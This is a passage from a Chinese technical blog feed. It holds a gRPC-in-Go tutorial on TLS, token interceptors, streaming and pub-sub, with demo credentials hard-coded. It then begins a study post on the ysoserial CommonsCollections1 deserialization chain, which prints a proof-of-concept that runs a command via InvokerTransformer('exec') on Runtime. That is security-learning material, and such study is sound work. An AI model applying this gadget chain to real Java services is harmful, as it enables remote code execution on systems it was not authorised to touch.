class="line"><span class="comment">// SayHello implements helloworld.GreeterServer</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *server)</span></span> SayHello(ctx context.Context, in *pb.HelloRequest) (*pb.HelloReply, <span class="type">error</span>) &#123;</span><br><span class="line">	log.Printf(<span class="string">&quot;Received: %v %d&quot;</span>, in.GetName(), in.GetId())</span><br><span class="line">	<span class="keyword">return</span> &amp;pb.HelloReply&#123;Message: fmt.Sprintf(<span class="string">&quot;Hello %s %d\n&quot;</span>, in.GetName(), in.GetId())&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(s *server)</span></span> Login(ctx context.Context, request *pb.LoginRequest) (resp *pb.LoginResp, err <span class="type">error</span>) &#123;</span><br><span class="line">	<span class="keyword">if</span> request.Username == <span class="string">&quot;yhy&quot;</span> &amp;&amp; request.Password == <span class="string">&quot;123456&quot;</span> &#123;</span><br><span class="line">		jwtToken, err := token.GenerateToken(request.Username)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">nil</span>, err</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">return</span> &amp;pb.LoginResp&#123;Status: <span class="string">&quot;200&quot;</span>, Token: jwtToken&#125;, <span class="literal">nil</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> &amp;pb.LoginResp&#123;Status: <span class="string">&quot;401&quot;</span>, Token: <span class="string">&quot;&quot;</span>&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Interceptor 拦截器</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Interceptor</span><span class="params">(ctx context.Context, req <span class="keyword">interface</span>&#123;&#125;, info *grpc.UnaryServerInfo, handler grpc.UnaryHandler)</span></span> (resp <span class="keyword">interface</span>&#123;&#125;, err <span class="type">error</span>) &#123;</span><br><span class="line">	fmt.Printf(<span class="string">&quot;gRPC method1: %s, %v\n&quot;</span>, info.FullMethod, req)</span><br><span class="line">	<span class="keyword">if</span> info.FullMethod != <span class="string">&quot;/helloworld.Greeter/Login&quot;</span> &#123;</span><br><span class="line">		<span class="comment">//拦截普通方法请求，验证Token</span></span><br><span class="line">		username, err := token.CheckAuth(ctx)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			log.Printf(<span class="string">&quot;err : %v\n&quot;</span>, err)</span><br><span class="line">			<span class="keyword">return</span> resp, err</span><br><span class="line">		&#125;</span><br><span class="line">		log.Printf(<span class="string">&quot;用户 %s 登录\n&quot;</span>, username)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    resp, err = handler(ctx, req)</span><br><span class="line">	fmt.Printf(<span class="string">&quot;gRPC method2: %s, %v\n&quot;</span>, info.FullMethod, resp)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 继续处理请求</span></span><br><span class="line">	<span class="keyword">return</span> resp, err</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// 监听</span></span><br><span class="line">	lis, err := net.Listen(<span class="string">&quot;tcp&quot;</span>, <span class="string">&quot;:8999&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;failed to listen: %v&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// TLS认证</span></span><br><span class="line">	creds, err := credentials.NewServerTLSFromFile(<span class="string">&quot;/Users/yhy/go/workplace/grpcTest/ca/server.pem&quot;</span>, <span class="string">&quot;/Users/yhy/go/workplace/grpcTest/ca/server.key&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		grpclog.Fatalf(<span class="string">&quot;Failed to generate credentials %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建gRPC服务器,并开启TLS认证和Token认证</span></span><br><span class="line">	s := grpc.NewServer(grpc.Creds(creds), grpc.UnaryInterceptor(Interceptor))</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 在gRPC服务端注册服务</span></span><br><span class="line">	pb.RegisterGreeterServer(s, &amp;server&#123;&#125;)</span><br><span class="line"></span><br><span class="line">	log.Printf(<span class="string">&quot;server listening at %v&quot;</span>, lis.Addr())</span><br><span class="line">	err = s.Serve(lis)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		fmt.Println(err)</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>客户端代码</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;context&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc/credentials&quot;</span></span><br><span class="line">	<span class="string">&quot;google.golang.org/grpc/grpclog&quot;</span></span><br><span class="line">	pb <span class="string">&quot;grpcTest/helloworld&quot;</span></span><br><span class="line">	<span class="string">&quot;grpcTest/token&quot;</span></span><br><span class="line">	<span class="string">&quot;log&quot;</span></span><br><span class="line">	<span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">  @author: yhy</span></span><br><span class="line"><span class="comment">  @since: 2022/8/8</span></span><br><span class="line"><span class="comment">  @desc: //TODO</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	<span class="comment">// TLS认证</span></span><br><span class="line">	creds, err := credentials.NewClientTLSFromFile(<span class="string">&quot;/Users/yhy/go/workplace/grpcTest/ca/server.pem&quot;</span>, <span class="string">&quot;*.kuafu.com&quot;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		grpclog.Fatalf(<span class="string">&quot;Failed to generate credentials %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//连接服务端</span></span><br><span class="line">	conn, err := grpc.Dial(<span class="string">&quot;0.0.0.0:8999&quot;</span>, grpc.WithTransportCredentials(creds))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;did not connect: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line">	c := pb.NewGreeterClient(conn)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 调用 login 方法进行验证</span></span><br><span class="line">	login, err := c.Login(context.Background(), &amp;pb.LoginRequest&#123;Username: <span class="string">&quot;yhy&quot;</span>, Password: <span class="string">&quot;123456&quot;</span>&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;did not connect: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 获取 token</span></span><br><span class="line">	requestToken := <span class="built_in">new</span>(token.AuthToken)</span><br><span class="line">	requestToken.Token = login.Token</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 加上 token 连接服务端</span></span><br><span class="line">	conn, err = grpc.Dial(<span class="string">&quot;:8999&quot;</span>, grpc.WithTransportCredentials(creds), grpc.WithPerRPCCredentials(requestToken))</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;faild to connect: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> conn.Close()</span><br><span class="line">	c = pb.NewGreeterClient(conn)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Contact the server and print out its response.</span></span><br><span class="line">	ctx, cancel := context.WithTimeout(context.Background(), <span class="number">5</span>*time.Second)</span><br><span class="line">	<span class="keyword">defer</span> cancel()</span><br><span class="line">	r, err := c.SayHello(ctx, &amp;pb.HelloRequest&#123;</span><br><span class="line">		Name: <span class="string">&quot;yhy&quot;</span>,</span><br><span class="line">		Id:   <span class="number">1</span>,</span><br><span class="line">	&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatalf(<span class="string">&quot;could not greet: %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	log.Printf(<span class="string">&quot;Greeting: %s&quot;</span>, r.GetMessage())</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="双向流"><a href="#双向流" class="headerlink" title="双向流"></a>双向流</h2><p>普通RPC 就像正常调用方法一样，主要就是流式的使用，这里以双向流为例</p>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 指定使用 proto3 语法</span></span><br><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 指定最后生成的go文件是处在哪个目录哪个包中，.代表在当前目录生成，kuafu 代表了生成的go文件的包名是 kuafu。</span></span><br><span class="line"><span class="keyword">option</span> go_package = <span class="string">&quot;./historyPb&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 远程调用定义的消息类型</span></span><br><span class="line"><span class="keyword">service </span><span class="title class_">History</span> &#123;</span><br><span class="line"><span class="comment">// 双向流</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> User(stream UserHistory) <span class="keyword">returns</span> (stream UserHistory) </span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">UserHistory</span> &#123;</span><br><span class="line"><span class="type">string</span> msg = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>服务端实现</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// User 用户历史记录 客户端输入啥就返回啥</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(h *History)</span></span> User(stream historyPb.History_UserServer) <span class="type">error</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        res, err := stream.Recv()</span><br><span class="line">        <span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">        err = stream.Send(&amp;historyPb.UserHistory&#123;Msg: res.Msg&#125;)</span><br><span class="line">        <span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>客户端</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    ... 之前的一样</span><br><span class="line">    historyStream := historyPb.NewHistoryClient(conn)</span><br><span class="line">	streaming(historyStream)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端流式处理</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">streaming</span><span class="params">(client historyPb.HistoryClient)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	stream, err := client.User(context.Background())</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		logging.Logger.Errorf(<span class="string">&quot;stream err %v&quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">for</span> n := <span class="number">0</span>; n &lt; <span class="number">10</span>; n++ &#123;</span><br><span class="line">		err := stream.Send(&amp;historyPb.UserHistory&#123;Msg: strconv.Itoa(n)&#125;)</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> err</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Streaming Send: &quot;</span>, n)</span><br><span class="line">		res, err := stream.Recv()</span><br><span class="line">		<span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> err</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;Streaming Recv: &quot;</span>, res.Msg)</span><br><span class="line">	&#125;</span><br><span class="line">	stream.CloseSend()</span><br><span class="line">	<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="流式拦截器"><a href="#流式拦截器" class="headerlink" title="流式拦截器"></a>流式拦截器</h2><p>流拦截器过程和一元拦截器有所不同，同样可以分为 3 个阶段：</p>
<ul>
<li>预处理(pre-processing)</li>
<li>调用 RPC 方法(invoking RPC method)</li>
<li>后处理(post-processing)</li>
</ul>
<p>预处理阶段的拦截只是在流式请求第一次 发起的时候进行拦截，后面的流式请求不会再进入到处理逻辑。<br>后面两种情况对应着 Streamer api 提供的两个扩展方法来进行，分别是 SendMsg 和 RecvMsg 方法。<br>正常情况下实现一个流式拦截器与普通拦截器一样，实现这个已经定义好的拦截器方法即可：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StreamInterceptor</span><span class="params">(srv <span class="keyword">interface</span>&#123;&#125;, ss grpc.ServerStream, info *grpc.StreamServerInfo, handler grpc.StreamHandler)</span></span> <span class="type">error</span> &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>如果是想在发消息之前和之进行处理， 则实现 SendMsg 和 RecvMsg</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> wrappedStream <span class="keyword">struct</span> &#123;</span><br><span class="line"> grpc.ServerStream</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">newWrappedStream</span><span class="params">(s grpc.ServerStream)</span></span> grpc.ServerStream &#123;</span><br><span class="line"> <span class="keyword">return</span> &amp;wrappedStream&#123;s&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *wrappedStream)</span></span> RecvMsg(m <span class="keyword">interface</span>&#123;&#125;) <span class="type">error</span> &#123;</span><br><span class="line"> fmt.Printf(<span class="string">&quot;Receive a message (Type: %T) at %s&quot;</span>, m, time.Now().Format(time.RFC3339))</span><br><span class="line"> <span class="keyword">return</span> w.ServerStream.RecvMsg(m)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(w *wrappedStream)</span></span> SendMsg(m <span class="keyword">interface</span>&#123;&#125;) <span class="type">error</span> &#123;</span><br><span class="line"> fmt.Printf(<span class="string">&quot;Send a message (Type: %T) at %v&quot;</span>, m, time.Now().Format(time.RFC3339))</span><br><span class="line"> <span class="keyword">return</span> w.ServerStream.SendMsg(m)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用流式拦截器服务端修改， 下面就是同时使用流式和普通拦截器</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">//创建gRPC服务器,并开启TLS认证和Token认证</span></span><br><span class="line">	s := grpc.NewServer(grpc.Creds(creds),grpc.UnaryInterceptor(service.Commonnterceptor), grpc.StreamInterceptor(service.StreamInterceptor))</span><br></pre></td></tr></table></figure>
<p>流式拦截器认证</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// StreamInterceptor 流拦截器</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">StreamInterceptor</span><span class="params">(srv <span class="keyword">interface</span>&#123;&#125;, ss grpc.ServerStream, info *grpc.StreamServerInfo, handler grpc.StreamHandler)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">	logging.Logger.Infof(<span class="string">&quot;gRPC stream method1: %s &quot;</span>, info.FullMethod)</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 流式验证Token</span></span><br><span class="line">	username, err := middleware.CheckAuth(ss.Context())</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		logging.Logger.Warnf(<span class="string">&quot;err : %v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	err = handler(srv, newWrappedStream(ss))</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		logging.Logger.Warnf(<span class="string">&quot;err11 : %v\n&quot;</span>, err)</span><br><span class="line">		<span class="keyword">return</span> err</span><br><span class="line">	&#125;</span><br><span class="line">	logging.Logger.Infof(<span class="string">&quot;gRPC stream method2: %s &quot;</span>, info.FullMethod)</span><br><span class="line">	logging.Logger.Infof(<span class="string">&quot;用户 %s &quot;</span>, username)</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> err</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="发布订阅模式"><a href="#发布订阅模式" class="headerlink" title="发布订阅模式"></a>发布订阅模式</h2><blockquote>
<p>服务端的信息更改时，通知客户端</p>
</blockquote>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax=<span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> pb;</span><br><span class="line"><span class="keyword">option</span> go_package=<span class="string">&quot;./pb&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Msg</span>&#123;</span><br><span class="line"><span class="type">string</span> value=<span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">service </span><span class="title class_">PubsubService</span> &#123;</span><br><span class="line"><span class="comment">// 发布是rpc的普通方法</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Publish (Msg) <span class="keyword">returns</span> (Msg)</span>;</span><br><span class="line"><span class="comment">// 订阅则是一个单向的流服务，服务端返回的数据可能很大</span></span><br><span class="line"><span class="function"><span class="keyword">rpc</span> Subscribe (Msg) <span class="keyword">returns</span> (stream Msg)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> service</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;context&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/ZhuriLab/KuaFuServer/grpc/pb/pb&quot;</span></span><br><span class="line">    <span class="string">&quot;github.com/docker/docker/pkg/pubsub&quot;</span></span><br><span class="line">    <span class="string">&quot;strings&quot;</span></span><br><span class="line">    <span class="string">&quot;time&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">@author: yhy</span></span><br><span class="line"><span class="comment">@since: 2022/8/11</span></span><br><span class="line"><span class="comment">@desc: //TODO</span></span><br><span class="line"><span class="comment">**/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> PubsubService <span class="keyword">struct</span> &#123;</span><br><span class="line">    pub *pubsub.Publisher</span><br><span class="line">    pb.UnimplementedPubsubServiceServer</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">NewPubsubService</span><span class="params">()</span></span> *PubsubService &#123;</span><br><span class="line">    <span class="keyword">return</span> &amp;PubsubService&#123;</span><br><span class="line">        pub: pubsub.NewPublisher(<span class="number">100</span>*time.Millisecond, <span class="number">10</span>),</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Publish 实现发布方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *PubsubService)</span></span> Publish(ctx context.Context, arg *pb.Msg) (*pb.Msg, <span class="type">error</span>) &#123;</span><br><span class="line">    <span class="comment">// 发布消息</span></span><br><span class="line">    p.pub.Publish(arg.GetValue())</span><br><span class="line">    <span class="keyword">return</span> &amp;pb.Msg&#123;&#125;, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Subscribe 实现订阅方法</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="params">(p *PubsubService)</span></span> Subscribe(arg *pb.Msg, stream pb.PubsubService_SubscribeServer) <span class="type">error</span> &#123;</span><br><span class="line">    <span class="comment">// SubscribeTopic 增加一个使用函数过滤器的订阅者</span></span><br><span class="line">    <span class="comment">// func(v interface&#123;&#125;) 定义函数过滤的规则</span></span><br><span class="line">    <span class="comment">// SubscribeTopic 返回一个chan interface&#123;&#125;</span></span><br><span class="line">    ch := p.pub.SubscribeTopic(<span class="function"><span class="keyword">func</span><span class="params">(v <span class="keyword">interface</span>&#123;&#125;)</span></span> <span class="type">bool</span> &#123;</span><br><span class="line">        <span class="comment">// 接收数据是string，并且key是以arg为前缀的</span></span><br><span class="line">        <span class="keyword">if</span> key, ok := v.(<span class="type">string</span>); ok &#123;</span><br><span class="line">            <span class="keyword">if</span> strings.HasPrefix(key, arg.GetValue()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span></span><br><span class="line">    &#125;)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 服务器遍历chan，并将其中信息发送给订阅客户端</span></span><br><span class="line">    <span class="keyword">for</span> v := <span class="keyword">range</span> ch &#123;</span><br><span class="line">        <span class="keyword">if</span> err := stream.Send(&amp;pb.Msg&#123;Value: v.(<span class="type">string</span>)&#125;); err != <span class="literal">nil</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> err</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>服务端</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">pb.RegisterPubsubServiceServer(s, service.NewPubsubService())</span><br></pre></td></tr></table></figure>
<p>客户端</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    ....</span><br><span class="line">    <span class="keyword">go</span> Subscribe(conn)</span><br><span class="line"></span><br><span class="line">	client := pb.NewPubsubServiceClient(conn)</span><br><span class="line">	<span class="comment">// 客户端发布信息 golang :hello Go</span></span><br><span class="line">	_, err := client.Publish(context.Background(), &amp;pb.Msg&#123;Value: <span class="string">&quot;golang: hello Go&quot;</span>&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(err)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 订阅</span></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Subscribe</span><span class="params">(conn *grpc.ClientConn)</span></span> &#123;</span><br><span class="line">	<span class="comment">// 新建一个客户端</span></span><br><span class="line">	client := pb.NewPubsubServiceClient(conn)</span><br><span class="line">	<span class="comment">// 订阅服务，传入参数是 golang:</span></span><br><span class="line">	<span class="comment">// 会想过滤器函数，订阅者应该收到的信息为 golang: hello Go</span></span><br><span class="line">	stream, err := client.Subscribe(context.Background(), &amp;pb.Msg&#123;Value: <span class="string">&quot;golang: &quot;</span>&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		log.Fatal(<span class="string">&quot;123 &quot;</span>, err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 阻塞遍历流，输出结果</span></span><br><span class="line">	<span class="keyword">for</span> &#123;</span><br><span class="line">		reply, err := stream.Recv()</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">			<span class="keyword">if</span> err == io.EOF &#123;</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			&#125;</span><br><span class="line">			fmt.Println(<span class="string">&quot;=======1111=========&quot;</span>)</span><br><span class="line">			log.Fatal(<span class="string">&quot;22  &quot;</span>, err)</span><br><span class="line">		&#125;</span><br><span class="line">		fmt.Println(<span class="string">&quot;================&quot;</span>)</span><br><span class="line">		fmt.Println(reply.GetValue())</span><br><span class="line">		pkg.UserMsgContent += reply.GetValue()</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>开发</category>
      </categories>
      <tags>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Java ysoserial学习之CommonsCollections1(二)</title>
    <url>/2021/06/11/Java%20ysoserial%E5%AD%A6%E4%B9%A0%E4%B9%8BCommonsCollections1(%E4%BA%8C)/</url>
    <content><![CDATA[<blockquote>
<p>  超长预警</p>
</blockquote>
<h2 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h2><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p>
<p>Apache Commons Collections 中提供了一个Transformer的类，这个接口的功能就是将一个对象转换为另外一个对象，CC链都依赖于此。</p>
<p>本文CommonsCollections1利用链的限制条件：</p>
<p>​	JDK版本：jdk1.8以前（8u71之后已修复不可利用）、Commons-Collections 3.1-3.2.1</p>
<p>实验环境：</p>
<p>​	JDK 1.7.0_80、Commons-Collections 3.2.1 </p>
<h2 id="0x02-P牛简化的利用链Demo分析"><a href="#0x02-P牛简化的利用链Demo分析" class="headerlink" title="0x02 P牛简化的利用链Demo分析"></a>0x02 P牛简化的利用链Demo分析</h2><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[] &#123;<span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>, transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>我们来逐行分析这个简单的Demo</p>
<h3 id="2-1-Transformer-接口"><a href="#2-1-Transformer-接口" class="headerlink" title="2.1 Transformer 接口"></a>2.1 Transformer 接口</h3><p>Transformer是一个接口，它只有一个待实现的<code>transform</code>方法:</p>
